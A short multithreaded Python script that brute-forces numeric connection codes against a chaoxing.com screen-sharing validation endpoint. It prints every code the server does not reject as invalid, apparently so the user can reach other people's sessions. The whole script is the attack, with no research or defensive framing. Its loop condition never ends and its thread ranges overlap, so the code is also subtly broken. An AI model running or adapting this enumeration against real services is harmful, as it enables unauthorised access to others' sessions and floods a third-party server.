import requests
import threading
import time
i=1000


def f1(i):
    while i<=i+(9999/6):
        url="http://x.chaoxing.com/apis/toScreen/isCodeValid?connectCode="+str(i)
        try:
            flag=requests.get(url).text
            if "无效" not in flag:
                print(i)
            i+=1
        except:
            print("erro")
    
from threading import Thread
# 创建一个线程
for k in range(0,5):
    t = Thread(target=f1, args=(int(i+k*(9999/6)),))
    # 启动刚刚创建的线程
    t.start()
